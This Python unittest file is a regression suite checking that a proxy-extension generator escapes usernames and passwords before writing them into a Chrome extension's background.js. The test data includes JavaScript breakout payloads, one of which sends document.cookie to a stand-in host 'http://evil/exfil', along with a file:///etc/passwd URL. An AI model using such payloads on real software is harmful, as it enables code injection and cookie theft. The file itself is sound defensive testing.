"""
Test: Proxy extension background.js must be safe against JS injection
via caller-supplied username/password.

Regression test for CWE-96 (Improper Neutralization of Directives in
Statically Saved Code) in create_proxy_extension().

The original code used Python %s string interpolation to embed username
and password into a JavaScript string literal inside background.js.
A malicious value containing `"); evil_code; //` would break out of
the string and execute arbitrary JS in the Chrome extension context.
"""
import json
import os
import re
import shutil
import sys
import unittest

# Add src to path so we can import utils
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'src'))


class TestProxyExtensionInjection(unittest.TestCase):
    """Verify that create_proxy_extension safely escapes all caller values."""

    def _read_background_js(self, proxy):
        """Create the extension and read back background.js."""
        from utils import create_proxy_extension
        ext_dir = create_proxy_extension(proxy)
        try:
            with open(os.path.join(ext_dir, "background.js"), "r") as f:
                return f.read()
        finally:
            shutil.rmtree(ext_dir, ignore_errors=True)

    def _make_proxy(self, username="user", password="pass"):
        return {
            "url": "http://127.0.0.1:8888",
            "username": username,
            "password": password,
        }

    # ── JS injection attempts ─────────────────────────────────────────

    def test_username_with_js_breakout(self):
        """A username containing JS breakout must not produce executable JS."""
        evil = 'x"); chrome.tabs.create({url:"http://evil/"}); //'
        bg = self._read_background_js(self._make_proxy(username=evil))
        # The evil string must appear as a properly escaped JSON literal,
        # not as raw executable JavaScript.
        # If the injection succeeded, we'd see an unescaped "); sequence
        # inside the username value that breaks out of the string.
        self.assertNotIn(
            'x"); chrome.tabs.create',
            bg,
            "Username JS injection was NOT escaped — code would execute in the extension"
        )

    def test_password_with_js_breakout(self):
        """A password containing JS breakout must not produce executable JS."""
        evil = '"); fetch("http://evil/exfil?c=" + document.cookie); //'
        bg = self._read_background_js(self._make_proxy(password=evil))
        self.assertNotIn(
            '"); fetch("http://evil',
            bg,
            "Password JS injection was NOT escaped — code would execute in the extension"
        )

    def test_username_with_backtick_template(self):
        """Backtick template literal injection must be neutralized."""
        evil = 'x`; chrome.tabs.create({url:`http://evil/`}); //'
        bg = self._read_background_js(self._make_proxy(username=evil))
        # The backtick must be escaped (json.dumps escapes it as \\u0060
        # or the validator rejects it)
        self.assertNotIn(
            'chrome.tabs.create',
            bg,
            "Backtick template injection was NOT neutralized"
        )

    def test_username_with_newline_injection(self):
        """Newline in username must not break the JS string literal."""
        evil = "user\n); evil(); //"
        bg = self._read_background_js(self._make_proxy(username=evil))
        self.assertNotIn(
            "evil();",
            bg,
            "Newline injection produced executable JS"
        )

    # ── Type confusion ────────────────────────────────────────────────

    def test_non_string_username_rejected(self):
        """Non-string username must be rejected, not silently coerced."""
        from utils import create_proxy_extension
        proxy = self._make_proxy(username=12345)
        with self.assertRaises((ValueError, TypeError)):
            create_proxy_extension(proxy)

    def test_non_string_password_rejected(self):
        """Non-string password must be rejected."""
        from utils import create_proxy_extension
        proxy = self._make_proxy(password=None)
        with self.assertRaises((ValueError, TypeError, KeyError)):
            create_proxy_extension(proxy)

    # ── Scheme and port validation ────────────────────────────────────

    def test_invalid_scheme_rejected(self):
        """Non-http(s) scheme must be rejected."""
        from utils import create_proxy_extension
        proxy = self._make_proxy()
        proxy["url"] = "file:///etc/passwd"
        with self.assertRaises(ValueError):
            create_proxy_extension(proxy)

    def test_invalid_port_rejected(self):
        """Out-of-range port must be rejected."""
        from utils import create_proxy_extension
        proxy = self._make_proxy()
        proxy["url"] = "http://127.0.0.1:99999"
        with self.assertRaises(ValueError):
            create_proxy_extension(proxy)

    # ── Normal values still work ──────────────────────────────────────

    def test_normal_credentials_preserved(self):
        """Normal username/password must appear correctly in the output."""
        bg = self._read_background_js(self._make_proxy(username="myuser", password="mypass"))
        self.assertIn("myuser", bg)
        self.assertIn("mypass", bg)

    def test_credentials_with_special_chars(self):
        """Credentials with safe special characters should be handled."""
        # These characters are safe within a JSON/JS string literal
        bg = self._read_background_js(self._make_proxy(username="user@domain", password="p@ss!word"))
        self.assertIn("user@domain", bg)
        self.assertIn("p@ss!word", bg)


if __name__ == "__main__":
    unittest.main()
